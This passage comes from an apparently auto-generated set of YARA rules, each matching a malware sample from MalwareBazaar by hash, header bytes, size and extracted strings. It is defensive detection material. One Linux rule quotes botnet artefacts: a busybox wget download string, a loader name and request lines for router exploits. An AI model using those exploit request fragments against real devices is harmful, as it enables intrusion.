        $s10 = "@System.ComponentModel.Primitives"
        $s11 = "HSystem.ComponentModel.Primitives.dll"
        $s12 = "$System.ObjectModel"
        $s13 = ",System.ObjectModel.dll"
        $s14 = "System.Linq"
        $s15 = "System.Linq.dll"
        $s16 = "System"
        $s17 = "System.dllFSystem.ComponentModel.TypeConverter"
        $s18 = "NSystem.ComponentModel.TypeConverter.dll"
        $s19 = ":System.Collections.NonGeneric"
        $s20 = "BSystem.Collections.NonGeneric.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5320KB and
        all of them
}

rule Windows_3ff25536a0efe6eb1f6de670d7d160733e6c3999c51a8673bc22c26ba30ede49
{
    meta:
        description = "Auto ML: 3ff25536a0efe6eb1f6de670d7d160733e6c3999c51a8673bc22c26ba30ede49"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.rsrc"
        $s6 = "System"
        $s7 = "Create"
        $s8 = "IOffset"
        $s9 = "ImplGetter"
        $s10 = "GetInterface"
        $s11 = "GetInterfaceEntry"
        $s12 = "GetInterfaceTable"
        $s13 = "GetHashCode"
        $s14 = "NewInstance"
        $s15 = "TMonitor.PWaitingThread"
        $s16 = "TMonitor.TWaitingThread"
        $s17 = "Thread"
        $s18 = "FOwningThread"
        $s19 = "SetSpinCount"
        $s20 = "tkSet"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 3162KB and
        all of them
}

rule Windows_3ffabf91b3bcdc13d8ea54822e00ba760d783bda55893b29e255abf119865305
{
    meta:
        description = "Auto ML: 3ffabf91b3bcdc13d8ea54822e00ba760d783bda55893b29e255abf119865305"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "Software\\Microsoft\\Windows\\CurrentVersion"
        $s6 = "DeleteFileA"
        $s7 = "FindFirstFileA"
        $s8 = "FindNextFileA"
        $s9 = "FindClose"
        $s10 = "SetFilePointer"
        $s11 = "ReadFile"
        $s12 = "WriteFile"
        $s13 = "GetPrivateProfileStringA"
        $s14 = "WritePrivateProfileStringA"
        $s15 = "GetProcAddress"
        $s16 = "LoadLibraryExA"
        $s17 = "GetModuleHandleA"
        $s18 = "GetExitCodeProcess"
        $s19 = "CloseHandle"
        $s20 = "SetFileTime"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 253KB and
        all of them
}

rule Windows_404afd3c18b203aa9ce9f8f5f9b7a813fda0d2a322252cd28e002e142080a4f7
{
    meta:
        description = "Auto ML: 404afd3c18b203aa9ce9f8f5f9b7a813fda0d2a322252cd28e002e142080a4f7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 204KB and
        all of them
}

rule Windows_4098768512e0290686ce227b5f60f597b47467cc5dff2f06651d4a7c0a80caa2
{
    meta:
        description = "Auto ML: 4098768512e0290686ce227b5f60f597b47467cc5dff2f06651d4a7c0a80caa2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "unicode_characters_and_symbols_for_reading"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System"
        $s7 = "System.Diagnostics"
        $s8 = "System.Reflection"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "System.Security"
        $s14 = "SecurityRuleSet"
        $s15 = "unicode_characters_and_symbols_for_reading.exe"
        $s16 = "<Module>"
        $s17 = "unicode_characters_and_symbols_for_reading.My"
        $s18 = "ThreadSafeObjectProvider`1"
        $s19 = "unicode_characters_and_symbols_for_reading.My.Resources"
        $s20 = "MySettings"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5667KB and
        all of them
}

rule Windows_40e261e7bffce05b06dc3d6feaa430d310ec8bde473e1136255965b8aa28f925
{
    meta:
        description = "Auto ML: 40e261e7bffce05b06dc3d6feaa430d310ec8bde473e1136255965b8aa28f925"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".data"
        $s2 = ".rsrc"
        $s3 = "Kget"
        $s4 = "Mget"
        $s5 = "Jget"
        $s6 = "get^Jget"
        $s7 = "Lget"
        $s8 = "MMget"
        $s9 = "%SystemRoot%\\System32\\"
        $s10 = "sainbox.exe"
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point not loaded"
        $s15 = "GetLastActivePopup"
        $s16 = "GetActiveWindow"
        $s17 = "user32.dll"
        $s18 = "GetProcessHeap"
        $s19 = "GetProcAddress"
        $s20 = "LoadLibraryA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1213KB and
        all of them
}

rule Linux_414ec49b347b21c68cb49cb6950047000e988e2a6bd1cee4d8a4568c10fe778d
{
    meta:
        description = "Auto ML: 414ec49b347b21c68cb49cb6950047000e988e2a6bd1cee4d8a4568c10fe778d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 1159KB and
        all of them
}

rule Linux_053fd0e6c798ff6ad4869b706f55c109df888cebd996ededdc8910a612506bd5
{
    meta:
        description = "Auto ML: 053fd0e6c798ff6ad4869b706f55c109df888cebd996ededdc8910a612506bd5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 199KB and
        all of them
}

rule Windows_41971da9cb866aa19e6d70d62287f622bb79d9cbbee1a8a29c44ecc3b066afc6
{
    meta:
        description = "Auto ML: 41971da9cb866aa19e6d70d62287f622bb79d9cbbee1a8a29c44ecc3b066afc6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Runtime.InteropServices"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.CompilerServices"
        $s9 = "System.Core"
        $s10 = "<Module>"
        $s11 = "System.IO"
        $s12 = "c4p0OFLT85gCReVwinp"
        $s13 = "<Module>{158E61B7-D232-435C-8277-5DA9952E7C9A}"
        $s14 = "<Module>{23c7c149-b8a5-4086-90f1-04302eaf6a59}"
        $s15 = "System.Text"
        $s16 = "System.Collections.Generic"
        $s17 = "System.Linq"
        $s18 = "GetEnumerator"
        $s19 = "get_Current"
        $s20 = "get_Count"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1605KB and
        all of them
}

rule Windows_41dbdaeb1dc8fe40358a5e168af596da85c6a84796e63c9d10c11f2077129eaf
{
    meta:
        description = "Auto ML: 41dbdaeb1dc8fe40358a5e168af596da85c6a84796e63c9d10c11f2077129eaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "WNetCloseEnum"
        $s6 = "WNetOpenEnumW"
        $s7 = "WNetUseConnectionW"
        $s8 = "GetIpAddrTable"
        $s9 = "IPHLPAPI.DLL"
        $s10 = "WinHttpReceiveResponse"
        $s11 = "WinHttpSendRequest"
        $s12 = "WinHttpConnect"
        $s13 = "WinHttpCloseHandle"
        $s14 = "WinHttpOpen"
        $s15 = "WinHttpOpenRequest"
        $s16 = "WINHTTP.dll"
        $s17 = "ExitProcess"
        $s18 = "SetFilePointer"
        $s19 = "GetComputerNameW"
        $s20 = "SetEvent"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 56KB and
        all of them
}

rule Windows_42de7a49058e8d6f5d75496d3d162e3a50aa6a6f5b153cdf5e22c39f125c363c
{
    meta:
        description = "Auto ML: 42de7a49058e8d6f5d75496d3d162e3a50aa6a6f5b153cdf5e22c39f125c363c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "kernel32.dll"
        $s6 = "GAIsProcessorFeaturePresent"
        $s7 = "KERNEL32"
        $s8 = "FlsSetValue"
        $s9 = "FlsGetValue"
        $s10 = "CorExitProcess"
        $s11 = "An application has made an attempt to load the C runtime library incorrectly."
        $s12 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s13 = "- Attempt to initialize the CRT more than once."
        $s14 = "- unable to open console device"
        $s15 = "- unexpected multithread lock error"
        $s16 = "- not enough space for thread data"
        $s17 = "- floating point support not loaded"
        $s18 = "`local static thread guard'"
        $s19 = "`placement delete[] closure'"
        $s20 = "`placement delete closure'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 246KB and
        all of them
}

rule Windows_4315c14af0772f50b9b383cae378f26e71e77156886209344791c7f931d6425c
{
    meta:
        description = "Auto ML: 4315c14af0772f50b9b383cae378f26e71e77156886209344791c7f931d6425c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".rsrc"
        $s6 = "@.reloc"
        $s7 = "SetThreadPreferredUILanguages"
        $s8 = "SetProcessPreferredUILanguages"
        $s9 = "GetNativeSystemInfo"
        $s10 = "Could not overwrite file \"%s\"."
        $s11 = "Could not create file \"%s\"."
        $s12 = "No \"HelpText\" in the configuration file."
        $s13 = "\"setup.exe\""
        $s14 = "Could not find \"setup.exe\"."
        $s15 = "Could not delete file or folder \"%s\"."
        $s16 = "Could not create folder \"%s\"."
        $s17 = "Could not write SFX configuration."
        $s18 = "Could not read SFX configuration or configuration not found."
        $s19 = "Could not open archive file \"%s\"."
        $s20 = "Could not get SFX filename."
    condition:
        uint32(0) == 0x00605a4d and
        filesize < 1069KB and
        all of them
}

rule Windows_431fd29552ea2ff3ade5f1c8c2c4e0b3d0eda33164a4487c4bc9174bc6bd4a44
{
    meta:
        description = "Auto ML: 431fd29552ea2ff3ade5f1c8c2c4e0b3d0eda33164a4487c4bc9174bc6bd4a44"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System.ComponentModel"
        $s7 = "System.CodeDom.Compiler"
        $s8 = "System.Diagnostics"
        $s9 = "DebuggerNonUserCodeAttribute"
        $s10 = "System"
        $s11 = "Microsoft.VisualBasic.CompilerServices"
        $s12 = "StandardModuleAttribute"
        $s13 = "HideModuleNameAttribute"
        $s14 = "GetObjectValue"
        $s15 = "GetHashCode"
        $s16 = "GetTypeFromHandle"
        $s17 = "CreateInstance"
        $s18 = "System.Runtime.InteropServices"
        $s19 = "ThreadStaticAttribute"
        $s20 = "m_ThreadStaticValue"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 151KB and
        all of them
}

rule Windows_435a12ab59bb78ad797f1f9b4b2fad50799bc217e93669bf543540b358a5dcdc
{
    meta:
        description = "Auto ML: 435a12ab59bb78ad797f1f9b4b2fad50799bc217e93669bf543540b358a5dcdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "CCmdTarget"
        $s7 = "ImageList_GetImageInfo"
        $s8 = "GetMonitorInfoA"
        $s9 = "GetMonitorInfoW"
        $s10 = "MonitorFromWindow"
        $s11 = "GetSystemMetrics"
        $s12 = "CMDIChildWnd"
        $s13 = "CMDIFrameWnd"
        $s14 = "DllGetVersion"
        $s15 = "CWinApp"
        $s16 = "CreateActCtxW"
        $s17 = "UnregserverPerUser"
        $s18 = "UnregisterPerUser"
        $s19 = "RegserverPerUser"
        $s20 = "RegisterPerUser"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1059KB and
        all of them
}

rule Windows_43bdfc9704b3cf395af87f2bee4d8e06ba314e99a545b32a5416249744dc6961
{
    meta:
        description = "Auto ML: 43bdfc9704b3cf395af87f2bee4d8e06ba314e99a545b32a5416249744dc6961"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System.ComponentModel"
        $s7 = "System.CodeDom.Compiler"
        $s8 = "System.Diagnostics"
        $s9 = "DebuggerNonUserCodeAttribute"
        $s10 = "System"
        $s11 = "Microsoft.VisualBasic.CompilerServices"
        $s12 = "StandardModuleAttribute"
        $s13 = "HideModuleNameAttribute"
        $s14 = "GetObjectValue"
        $s15 = "GetHashCode"
        $s16 = "GetTypeFromHandle"
        $s17 = "CreateInstance"
        $s18 = "System.Runtime.InteropServices"
        $s19 = "ThreadStaticAttribute"
        $s20 = "m_ThreadStaticValue"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 37KB and
        all of them
}

rule Windows_43d0cd2a2ebaf029a98545e0cd3b0013ae7564fe9e0e19b378e67c8b0737d29e
{
    meta:
        description = "Auto ML: 43d0cd2a2ebaf029a98545e0cd3b0013ae7564fe9e0e19b378e67c8b0737d29e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "EWIn"
        $s4 = "Oset"
        $s5 = "aGetR<FL"
        $s6 = "fNWIN"
        $s7 = "Vacuum.exe"
        $s8 = "<Module>"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "System.Reflection"
        $s11 = "System"
        $s12 = "System.IO"
        $s13 = "m_OutWindow"
        $s14 = "SetDictionarySize"
        $s15 = "SetLiteralProperties"
        $s16 = "SetPosBitsProperties"
        $s17 = "SetDecoderProperties"
        $s18 = "GetLenToPosState"
        $s19 = "Create"
        $s20 = "GetState"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6127KB and
        all of them
}

rule Windows_440735ee865d661efeef4060d676239d02cf3e8d9f47a95f48358d7e19bc08a5
{
    meta:
        description = "Auto ML: 440735ee865d661efeef4060d676239d02cf3e8d9f47a95f48358d7e19bc08a5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "h.rsrc"
        $s5 = "api-ms-win-crt-locale-l1-1-0.dll"
        $s6 = "LoadLibraryA"
        $s7 = "SHELL32.dll"
        $s8 = "SetCursor"
        $s9 = ";api-ms-win-crt-heap-l1-1-0.dll"
        $s10 = "WTSAPI32.dll"
        $s11 = "WLDAP32.dll"
        $s12 = "Normaliz.dll"
        $s13 = "ShellExecuteW"
        $s14 = "VCRUNTIME140.dll"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetProcAddress"
        $s17 = "api-ms-win-crt-runtime-l1-1-0.dll"
        $s18 = "api-ms-win-crt-stdio-l1-1-0.dll"
        $s19 = "MSVCP140.dll"
        $s20 = "api-ms-win-crt-environment-l1-1-0.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 11358KB and
        all of them
}

rule Windows_441cc4670d7c22a5b25f09d098e3d47022447e43f020b24f31e1d6ffc525a43f
{
    meta:
        description = "Auto ML: 441cc4670d7c22a5b25f09d098e3d47022447e43f020b24f31e1d6ffc525a43f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<DeleteSelectedNodes>b__50_0"
        $s5 = "<GetInputs>b__66_0"
        $s6 = "<get_OutputSocket>b__17_0"
        $s7 = "<GetOutputs>b__67_0"
        $s8 = "<get_InputSocket>b__19_0"
        $s9 = "<GetNodes>b__0"
        $s10 = "<DeleteSelectedNodes>b__50_1"
        $s11 = "get_Panel1"
        $s12 = "ReadInt32"
        $s13 = "<DeleteSelectedNodes>b__50_2"
        $s14 = "get_Panel2"
        $s15 = "<DeleteSelectedNodes>b__3"
        $s16 = "<DeleteSelectedNodes>b__50_4"
        $s17 = "<Module>"
        $s18 = "System.Drawing.Drawing2D"
        $s19 = "System.IO"
        $s20 = "get_hauY"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 668KB and
        all of them
}

rule Windows_0575c960e8384fa8581549a2ec59fe1a722f1954a2280319807216a2ca247453
{
    meta:
        description = "Auto ML: 0575c960e8384fa8581549a2ec59fe1a722f1954a2280319807216a2ca247453"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Runtime.InteropServices"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.CompilerServices"
        $s9 = "System.Core"
        $s10 = "<Module>"
        $s11 = "System.IO"
        $s12 = "CMdC0sXNyBKnsmmodjv"
        $s13 = "<Module>{F517B102-AC79-4EFE-912D-43FDE0A069B0}"
        $s14 = "D3QFl44seTM8b0bPftU"
        $s15 = "<Module>{617895ef-7b56-434c-80cf-ccc090dbf94a}"
        $s16 = "XJEyoiqBkDfVZ6agOcmD"
        $s17 = "cthUX0qAtwKNfqMtMwIN"
        $s18 = "System.Text"
        $s19 = "System.Collections.Generic"
        $s20 = "System.Linq"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2967KB and
        all of them
}

rule Windows_4435491dfb816c72cd4efc7dde03acfc8ea703dba2114d513d687172d720f6da
{
    meta:
        description = "Auto ML: 4435491dfb816c72cd4efc7dde03acfc8ea703dba2114d513d687172d720f6da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6255KB and
        all of them
}

rule Windows_444b77c224199fbcb8e1241f999ea02b68e5cee7d74f262c160ae45d85cf1105
{
    meta:
        description = "Auto ML: 444b77c224199fbcb8e1241f999ea02b68e5cee7d74f262c160ae45d85cf1105"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "WINWQ"
        $s2 = ":file"
        $s3 = "_PROCESS"
        $s4 = "KERNEL32.DLL"
        $s5 = "winmm.dll"
        $s6 = "ExitProcess"
        $s7 = "GetProcAddress"
        $s8 = "LoadLibraryA"
        $s9 = "WSAGetOverlappedResult"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 978KB and
        all of them
}

rule Windows_447656e07d6d1d6fb418d284c5667445e92a7953e2529a28e1c23d597ce148da
{
    meta:
        description = "Auto ML: 447656e07d6d1d6fb418d284c5667445e92a7953e2529a28e1c23d597ce148da"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 258KB and
        all of them
}

rule Windows_4483a8b063ed1fe1b273f8de9ee77e7f4bdd037f64c406e5f97240bf87d280d0
{
    meta:
        description = "Auto ML: 4483a8b063ed1fe1b273f8de9ee77e7f4bdd037f64c406e5f97240bf87d280d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GameSettingsForm_Load_1"
        $s5 = "get_Item1"
        $s6 = "get_Player1"
        $s7 = "get_Item2"
        $s8 = "get_Player2"
        $s9 = "<Module>"
        $s10 = "getInstancia"
        $s11 = "get_paginaWebEmpresa"
        $s12 = "set_paginaWebEmpresa"
        $s13 = "get_razonSocialEmpresa"
        $s14 = "set_razonSocialEmpresa"
        $s15 = "get_direccionEmpresa"
        $s16 = "set_direccionEmpresa"
        $s17 = "get_correoEmpresa"
        $s18 = "set_correoEmpresa"
        $s19 = "get_telefonoEmpresa"
        $s20 = "set_telefonoEmpresa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 745KB and
        all of them
}

rule Windows_448581d13d9e2c91517959dd42d100b69419802a9c4387b87d50c5a87a749100
{
    meta:
        description = "Auto ML: 448581d13d9e2c91517959dd42d100b69419802a9c4387b87d50c5a87a749100"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "modnarodsetybdetuespemosarenegyl"
        $s6 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p."
        $s7 = "kernel32.dll"
        $s8 = "GetSystemTimePreciseAsFileTime"
        $s9 = "NtCancelIoFileEx"
        $s10 = "NtCreateFile"
        $s11 = "NtCreateKeyedEvent"
        $s12 = "NtDeviceIoControlFile"
        $s13 = "%s        hardware module name :"
        $s14 = "User Id"
        $s15 = "WSAGetLastError"
        $s16 = "closesocket"
        $s17 = "connect"
        $s18 = "getaddrinfo"
        $s19 = "getpeername"
        $s20 = "getsockname"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 1831KB and
        all of them
}

rule Windows_44bcd434152120ee0a54faa492cadf39c04ce7ddde871ab6ba053a343a512d0f
{
    meta:
        description = "Auto ML: 44bcd434152120ee0a54faa492cadf39c04ce7ddde871ab6ba053a343a512d0f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB and
        all of them
}

rule Windows_44cb3224a4807ac22c1f377956c092a9a05d18e0ba589a8c6504ba083df5d179
{
    meta:
        description = "Auto ML: 44cb3224a4807ac22c1f377956c092a9a05d18e0ba589a8c6504ba083df5d179"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_44e639bba7c908625909ccc32eaaaa343591873b037a877fe21db85652b24564
{
    meta:
        description = "Auto ML: 44e639bba7c908625909ccc32eaaaa343591873b037a877fe21db85652b24564"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4598KB and
        all of them
}

rule Windows_455a6a7f15ba86a0fe02ae1d8beff7a3dc8e858380244a45141054b0d330135c
{
    meta:
        description = "Auto ML: 455a6a7f15ba86a0fe02ae1d8beff7a3dc8e858380244a45141054b0d330135c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "JcMd#"
        $s5 = "teMP8"
